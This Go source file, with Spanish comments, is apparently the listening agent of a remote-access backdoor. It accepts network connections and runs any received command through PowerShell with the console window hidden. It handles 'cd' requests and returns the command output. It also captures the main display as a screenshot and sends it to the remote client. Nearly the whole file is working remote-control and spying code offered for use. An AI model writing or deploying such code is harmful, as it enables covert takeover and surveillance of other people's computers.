/*
en este modulo se maneja:

1. envio de comandos

2. ejecion de comandos

3. la puesta en escucha del programa en bucle
*/
package ejec

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

const TAMAÑO_BUFFER = 1024 // buffer para comandos promedios

// aca voy a poner la logica del startup y la ejecucion de comandos

// funcion similar a Envio( ) con la unica diferencia de que es para enviar imagenes por la red
func Enviar_img(conexion net.Conn, archivo string) error {
	buffer_tamaño := make([]byte, 8)

	imagen, error := os.Open(archivo)
	stat, _ := imagen.Stat() // obtengo stats de la imagen

	buffer_img := make([]byte, stat.Size()) // obtengo el tamaño y creo un buffer

	if error != nil {
		return errors.New("[!] no se encuentra la imagen")
	}
	n, error := imagen.Read(buffer_img)
	if error != nil {
		return errors.New("[!] error al codificar imagen")
	}
	binary.BigEndian.PutUint64(buffer_tamaño, uint64(n))
	Envio(conexion, buffer_tamaño)
	Envio(conexion, buffer_img)

	error_close := imagen.Close()
	if error_close != nil {
		return error_close
	}
	err := os.Remove(archivo)
	if err != nil {
		return err
	}
	return nil
}

// Ss : screenshare -> maneja la logica cuando el cliente envia un paquete ss
func Ss(conexion net.Conn) error {
	nombre := "captura.png"
	bordes := screenshot.GetDisplayBounds(0)
	img, error := screenshot.CaptureRect(bordes)
	if error != nil {

		return error
	}
	arch, error := os.Create(nombre)
	err := png.Encode(arch, img)
	if err != nil {
		return err
	}
	error_close := arch.Close()
	if error_close != nil {
		return error_close
	}
	error_enviar := Enviar_img(conexion, nombre)
	if error_enviar != nil {
		return error_enviar
	}
	return nil
}

// funcion que implementa la logica del comando cd
func Cd(entrada string, cliente net.Conn) {
	ruta, error := regexp.Compile(`cd (\S+)`)
	if error != nil {
		fmt.Println(error)
	} else {
		re := ruta.FindStringSubmatch(entrada)
		if len(re) > 1 && len(re) < 3 {
			ruta_str := re[1]

			error := os.Chdir(ruta_str)
			if error != nil {
				Envio(cliente, []byte("[!] error cambiando ruta"))
			} else {
				Envio(cliente, []byte("[*] ruta actualizada"))
			}
		}
	}

}

// maneja la ejecucion de comandos
func Ejecucion(entrada string) ([]byte, error) {
	comando := exec.Command("powershell", "-command", entrada)

	comando.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // ocultar ventana de cmd
	salida, error := comando.CombinedOutput()
	return salida, error

}

/*
funcion que envia el contenido de la ejecucion

salida -> byte - salida del cmd
*/
func Envio(conexion net.Conn, salida []byte) error {

	// envio del contenido del comando
	_, err := conexion.Write(salida)
	if err != nil {
		return err
	}
	return nil
}

func Escucha(conn net.Listener) {
	for {

		cliente, error := conn.Accept()
		if error != nil {
			fmt.Println(error)
		}
		Cliente(cliente)
	}
}

// maneja los comandos que llegan del cliente
func Cliente(cliente net.Conn) {

	defer cliente.Close()

	buffer := make([]byte, TAMAÑO_BUFFER)
	n, err := cliente.Read(buffer) //recibir el paquete del cliente
	if err != nil {
		fmt.Println(err)
	}
	entrada := string(buffer[:n]) // trasformar el paquete en string

	match, _ := regexp.Match("cd ", []byte(entrada))
	if match { // logica de cd
		Cd(entrada, cliente)

	} else if entrada == "ss" { // logica de ss
		ch_err := make(chan error)
		contx, cancelar := context.WithTimeout(context.Background(), time.Second*10)
		defer cancelar()
		go func() {

			ch_err <- Ss(cliente)

		}()
		select {
		case <-contx.Done():
			Envio(cliente, []byte("[!] SS tardo demasiado en responder"))
		case erro := <-ch_err:
			Envio(cliente, []byte(fmt.Sprintf("[!] hubo un error durante el screenshot : %s", erro)))
		}

	} else if entrada == "q" {
		fmt.Println("[!] cliente desconectado")
		return

	} else { // ejecucion de cualquier otro comando

		var ch_error = make(chan error)   // gestiona errores
		var ch_salida = make(chan []byte) // gestiona salidas de comando

		contexto, cancelar := context.WithTimeout(context.Background(), time.Second*5)

		defer cancelar()

		go func() {
			salida, err := Ejecucion(entrada)

			if err != nil {
				ch_error <- err
			} else {
				ch_salida <- salida
			}

		}()

		select {
		case <-contexto.Done():
			Envio(cliente, []byte("[!] tiempo de ejecucion agotado"))

		case salida := <-ch_salida:

			err := Envio(cliente, salida)

			if err != nil {
				fmt.Println("[!] hubo un problema al enviar")
			}

		case err := <-ch_error:

			fmt.Println("[!] hubo un problema: ", err)
		}

	}
}
